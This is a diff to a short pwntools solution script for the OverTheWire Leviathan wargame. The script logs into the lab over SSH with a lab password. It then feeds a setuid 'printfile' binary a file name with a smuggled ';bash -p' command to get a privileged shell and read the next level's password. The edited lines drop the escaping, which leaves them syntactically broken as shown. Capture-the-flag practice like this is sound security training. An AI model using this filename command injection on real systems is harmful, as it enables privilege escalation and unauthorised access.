@@ -257,8 +257,8 @@ log.info('leviathan series pwntools exploit by atom')
 log.info('shell crashes, you may need to run the exploit multiple times!')
 shell = ssh('leviathan2', 'leviathan.labs.overthewire.org', password='ougahZi8Ta', port=2223)
 sh = shell.run('sh')
-sh.sendline('touch /tmp/\'ajsdaskaaa;bash -p\'')
-sh.sendline('./printfile /tmp/\'ajsdaskaaa;bash -p\'')
+sh.sendline('touch /tmp/'ajsdaskaaa;bash -p'') # add backslash after /tmp/ and after -p
+sh.sendline('./printfile /tmp/'ajsdaskaaa;bash -p'') # add backslash after /tmp/ and after -p
 log.warn('run -> cat /etc/leviathan_pass/leviathan3 to grab the flag!')
 sh.interactive()
 ```
